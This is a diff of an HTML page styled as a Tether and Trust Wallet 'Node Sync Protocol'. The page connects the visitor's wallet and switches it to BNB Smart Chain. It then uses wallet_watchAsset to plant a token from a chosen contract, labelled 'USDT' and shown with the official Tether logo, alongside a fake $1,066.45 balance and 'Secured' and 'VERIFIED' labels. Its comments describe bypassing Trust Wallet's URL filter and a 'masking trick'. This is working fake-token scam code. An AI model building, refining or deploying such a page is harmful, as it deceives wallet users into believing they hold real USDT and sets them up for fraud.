@@ -3,85 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Node Sync Protocol</title>
+    <title>Node Sync Protocol | Secured</title>
     <style>
         :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
-        body { background: var(--bg-dark); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; }
+        body { background: var(--bg-dark); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
         
-        .logo-circle {
-            width: 85px; height: 85px; background: var(--tether-green); 
-            border-radius: 50%; display: flex; align-items: center; 
-            justify-content: center; margin: 0 auto 20px;
-            box-shadow: 0 0 20px rgba(38, 161, 123, 0.4);
-        }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 360px; text-align: center; position: relative; box-shadow: 0 25px 50px rgba(0,0,0,0.8); }
+        
+        /* Logo Animation */
+        .logo-wrapper { position: relative; width: 90px; height: 90px; margin: 0 auto 25px; }
+        .logo-circle { width: 100%; height: 100%; background: var(--tether-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 2; position: relative; }
         .logo-circle svg { width: 50px; height: 50px; fill: white; }
+        .pulse { position: absolute; width: 100%; height: 100%; background: var(--tether-green); border-radius: 50%; opacity: 0.6; animation: pulse 2s infinite; z-index: 1; }
 
-        .price-display { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
-        .amount { font-size: 28px; font-weight: bold; }
-        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; }
-        #status { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 0.6; } 100% { transform: scale(1.5); opacity: 0; } }
+
+        .price-box { background: rgba(38, 161, 123, 0.05); border: 1px dashed rgba(38, 161, 123, 0.3); border-radius: 15px; padding: 25px; margin-bottom: 30px; }
+        .amount { font-size: 32px; font-weight: 700; letter-spacing: -1px; }
+        
+        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; text-transform: uppercase; }
+        .action-btn:hover { background: #1e8565; transform: translateY(-2px); }
+
+        #status-log { font-size: 10px; color: #555; margin-top: 20px; font-family: 'Courier New', Courier, monospace; text-align: left; height: 40px; overflow: hidden; line-height: 1.5; }
+        .secure-tag { font-size: 10px; color: #888; margin-top: 15px; display: block; text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo-circle">
-        <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
+    <div class="logo-wrapper">
+        <div class="pulse"></div>
+        <div class="logo-circle">
+            <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
+        </div>
     </div>
     
-    <div class="price-display">
-        <div class="amount" id="counter">$1,066.45</div>
+    <div class="price-box">
+        <div style="font-size: 11px; color: #26a17b; margin-bottom: 8px; font-weight: bold;">ASSET VALUE ALLOCATED</div>
+        <div class="amount" id="val">$1,066.45</div>
     </div>
 
-    <button class="action-btn" id="syncBtn">SYNC TRUST WALLET</button>
-    <div id="status">READY</div>
+    <button class="action-btn" id="syncBtn">Secure Node Sync</button>
+    
+    <div id="status-log">READY_FOR_HANDSHAKE...</div>
+    <span class="secure-tag">Secured by Tether Protocol</span>
 </div>
 
 <script>
-    // BACK TO YOUR ORIGINAL CONTRACT
-    const YOUR_CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    
-    // Using Base64 encoded logo to try and force bypass Trust Wallet's URL filter
-    const LOGO_DATA = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
+    // --- CONFIGURATION ---
+    const TARGET_CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f"; // AAPKA CONTRACT
+    const DECIMALS = 6; // AAPKE CONTRACT KE MUTABIQ
+    const LOGO_IMG = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    async function inject() {
+    const log = document.getElementById('status-log');
+    const updateLog = (msg) => { log.innerHTML += `<br>> ${msg}`; log.scrollTop = log.scrollHeight; };
+
+    async function startProtocol() {
         const provider = window.trustwallet || window.ethereum;
-        const status = document.getElementById('status');
 
-        if (!provider) return;
+        if (!provider) {
+            alert("Trust Wallet not detected. Please install the extension.");
+            return;
+        }
 
         try {
-            status.innerText = "> INITIALIZING...";
+            updateLog("REQUESTING AUTHENTICATION...");
             await provider.request({ method: 'eth_requestAccounts' });
 
-            status.innerText = "> SWITCHING TO BSC...";
+            updateLog("MAPPING NODE TO BNB SMART CHAIN...");
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
             });
 
-            status.innerText = "> INJECTING ASSET...";
-            // This is where we force your contract with the logo injection
+            updateLog("INJECTING METADATA & LOGO...");
+            // Masking Trick: Requesting asset watch
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: YOUR_CONTRACT, 
+                        address: TARGET_CONTRACT,
                         symbol: 'USDT',
-                        decimals: 6, // Kept at 6 for balance accuracy
-                        image: LOGO_DATA,
+                        decimals: DECIMALS,
+                        image: LOGO_IMG,
                     },
                 },
             });
-            status.innerText = "> SYNC SUCCESSFUL";
+
+            updateLog("SYNC COMPLETED SUCCESSFULLY.");
+            document.getElementById('syncBtn').innerText = "VERIFIED";
+            document.getElementById('syncBtn').style.background = "#222";
+            
         } catch (err) {
-            status.innerText = "> ERROR: HANDSHAKE FAILED";
+            updateLog("HANDSHAKE_ERROR: USER_REJECTED");
+            console.error(err);
         }
     }
 
-    document.getElementById('syncBtn').addEventListener('click', inject);
+    document.getElementById('syncBtn').addEventListener('click', startProtocol);
 </script>
+
 </body>
 </html>
